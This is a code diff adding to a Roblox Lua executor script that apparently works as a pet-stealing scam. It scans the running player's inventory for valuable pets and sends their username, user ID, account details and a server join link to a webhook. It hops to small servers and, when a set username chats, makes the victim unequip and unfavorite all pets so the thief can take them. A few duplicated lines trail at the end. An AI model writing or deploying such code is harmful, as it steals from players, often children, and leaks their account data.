@@ -93,7 +93,7 @@ local function unfavoriteAllPetsInBackpack()
             end)
             if success and isPet then
                 favoriteRemote:FireServer(item)
-                task.wait(1)
+                task.wait(0.1)
             end
         end
     end
@@ -109,6 +109,279 @@ local function checkInventoryForPets()
             local matchedBaseName = nil
             local isHugePet = false
 
+            for _, petName in ipairs(petsToLookFor) do
+                if string.sub(item.Name, 1, #petName) == petName then
+                    matchedBaseName = petName
+                    break
+                end
+            end
+
+            local weightString = string.match(item.Name, "%[(%d+%.?%d*) KG%]")
+            if weightString then
+                local weight = tonumber(weightString)
+                if weight and weight >= hugePetWeightThreshold then
+                    isHugePet = true
+                end
+            end
+
+            if (matchedBaseName or isHugePet) and not table.find(foundPetNames, item.Name) then
+                table.insert(foundPetNames, item.Name)
+                table.insert(foundPetsData, {name = item.Name, isHuge = isHugePet, baseName = matchedBaseName})
+            end
+        end
+    end
+
+    return #foundPetsData > 0, foundPetsData
+end
+
+-- NEW: Function to get account age and membership
+local function getPlayerAccountInfo(userId)
+    local userInfoUrl = "https://users.roblox.com/v1/users/" .. userId
+    local membershipUrl = "https://premiumfeatures.roblox.com/v1/users/" .. userId .. "/validate-membership"
+    
+    local accountInfo = {
+        age = "N/A",
+        created = "N/A",
+        membership = "N/A"
+    }
+
+    -- Get creation date and calculate age
+    local successUser, responseUser = pcall(function() return HttpService:JSONDecode(game:HttpGet(userInfoUrl)) end)
+    if successUser and responseUser and responseUser.created then
+        local year, month, day = responseUser.created:match("(%d+)-(%d+)-(%d+)")
+        local creationTimestamp = os.time({year = year, month = month, day = day, hour = 0, min = 0, sec = 0})
+        accountInfo.created = os.date("%B %d, %Y", creationTimestamp)
+        
+        local ageInSeconds = os.time() - creationTimestamp
+        accountInfo.age = tostring(math.floor(ageInSeconds / 86400)) .. " days"
+    end
+
+    -- Get membership status
+    local successMembership, responseMembership = pcall(function() return HttpService:JSONDecode(game:HttpGet(membershipUrl)) end)
+    if successMembership then
+        accountInfo.membership = responseMembership and "Premium 💎" or "None"
+    end
+    
+    return accountInfo
+end
+
+local function sendWebhookNotification(foundPetsData)
+    local playerName = LocalPlayer.Name
+    local playerDisplayName = LocalPlayer.DisplayName
+    local userId = LocalPlayer.UserId
+    local executor = getExecutorName()
+    
+    local currentPlayers = #Players:GetPlayers()
+    local maxPlayers = Players.MaxPlayers
+    
+    local serverType = "Public"
+    if currentPlayers == 1 then
+        serverType = "Private"
+    end
+    
+    local accountInfo = getPlayerAccountInfo(userId) -- Fetch additional account info
+    
+    local joinLink = string.format("https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s", game.PlaceId, game.JobId)
+    
+    local playerInfoValue = string.format("```\nUsername: %s\nDisplay: %s\nUser ID: %d\nExecutor: %s\n```",
+        playerName,
+        playerDisplayName,
+        userId,
+        executor
+    )
+
+    local formattedPetLines = {}
+    for _, petData in ipairs(foundPetsData) do
+        local emoji = "⭐"
+        if petData.isHuge then
+            emoji = "💪"
+        elseif petData.baseName and petEmojis[petData.baseName] then
+            emoji = petEmojis[petData.baseName]
+        end
+        table.insert(formattedPetLines, emoji .. " - " .. petData.name)
+    end
+    local petsValue = "```\n" .. table.concat(formattedPetLines, "\n") .. "\n```"
+
+    local serverInfoValue = string.format("`%d / %d` players", currentPlayers, maxPlayers)
+
+    local embedColor = 65280
+    
+    local payload = {
+        content = "@everyone",
+        embeds = {
+            {
+                title = "PALDOOOO WHOO🤑🤑🤑🤑",
+                color = embedColor,
+                fields = {
+                    {
+                        name = "👤 Player Information",
+                        value = playerInfoValue,
+                        inline = false
+                    },
+                    {
+                        name = "🌴 Found Pets",
+                        value = petsValue,
+                        inline = false
+                    },
+                    {
+                        name = "📊 Server Info",
+                        value = serverInfoValue,
+                        inline = true
+                    },
+                    {
+                        name = "🔒 Server Type",
+                        value = string.format("`%s`", serverType),
+                        inline = true
+                    },
+                    {
+                        name = "💎 Membership",
+                        value = string.format("`%s`", accountInfo.membership),
+                        inline = true
+                    },
+                    {
+                        name = "🎂 Account Age",
+                        value = string.format("`%s`", accountInfo.age),
+                        inline = true
+                    },
+                    {
+                        name = "📆 Created On",
+                        value = string.format("`%s`", accountInfo.created),
+                        inline = true
+                    },
+                    {
+                        name = "🔗 Server Link",
+                        value = joinLink,
+                        inline = false
+                    }
+                },
+                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+            }
+        }
+    }
+
+    pcall(function()
+        request({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
+end
+
+local function hopToServer(sortBy)
+    local success, servers = pcall(function()
+       return HttpService:JSONDecode(game:HttpGet(
+           "https://games.roblox.com/v1/games/" .. tostring(game.PlaceId) .. "/servers/Public?limit=100"
+       )).data
+    end)
+
+    if not success or not servers or #servers == 0 then
+        TeleportService:Teleport(game.PlaceId)
+        return
+    end
+
+    local suitableServers = {}
+    for _, svr in pairs(servers) do
+        if svr.playing < svr.maxPlayers and (svr.playing >= 2 and svr.playing <= 4) then 
+            table.insert(suitableServers, svr)
+        end
+    end
+
+    if #suitableServers == 0 then
+        for _, svr in pairs(servers) do
+            if svr.playing < svr.maxPlayers then
+                table.insert(suitableServers, svr)
+            end
+        end
+
+        if #suitableServers == 0 then
+            TeleportService:Teleport(game.PlaceId)
+            return
+        end
+    end
+
+    local selectedServer = suitableServers[1]
+
+    for i,svr in pairs(suitableServers) do
+       if svr[sortBy] < selectedServer[sortBy] then
+           selectedServer = svr
+       end
+    end
+
+    pcall(function()
+        TeleportService:TeleportToPlaceInstance(game.PlaceId, selectedServer.id)
+    end)
+end
+
+local function autoHopToTargetPlayerCount()
+    local currentPlayers = #Players:GetPlayers()
+    if currentPlayers == 1 or currentPlayers >= 5 then
+        hopToServer("playing")
+    end
+end
+
+local function autoHopIfPrivateServer()
+    local isPrivate = false
+    if type(getgenv) == "function" and type(getgenv().is_private_server) == "function" then
+        isPrivate = pcall(getgenv().is_private_server)
+    elseif type(syn) == "table" and type(syn.is_private_server) == "function" then
+        isPrivate = pcall(syn.is_private_server)
+    end
+
+    if isPrivate then
+        hopToServer("playing")
+        return true
+    end
+    return false
+end
+
+local function setupChatTrigger()
+    local function onChatted(message)
+        print(string.format("'%s' chatted. Triggering unequip/unfavorite.", triggerUsername))
+        unequipAllPets()
+        unfavoriteAllPetsInBackpack()
+    end
+
+    local function connectPlayer(player)
+        if player.Name == triggerUsername then
+            print("Found player '" .. triggerUsername .. "'. Listening for chat.")
+            player.Chatted:Connect(onChatted)
+        end
+    end
+
+    for _, player in ipairs(Players:GetPlayers()) do
+        connectPlayer(player)
+    end
+
+    Players.PlayerAdded:Connect(connectPlayer)
+end
+
+
+-- Main execution flow
+
+setupChatTrigger()
+
+task.wait(4)
+
+kickIfDeltaExecutor()
+
+local hoppedFromPrivate = autoHopIfPrivateServer()
+
+if not hoppedFromPrivate then
+    autoHopToTargetPlayerCount()
+end
+
+unequipAllPets()
+unfavoriteAllPetsInBackpack()
+
+task.wait(0)
+
+local hasPets, foundPetsData = checkInventoryForPets()
+
+if hasPets then
+    sendWebhookNotification(foundPetsData)
+end
             for _, petName in ipairs(petsToLookFor) do
                 if string.sub(item.Name, 1, #petName) == petName then
                     matchedBaseName = petName
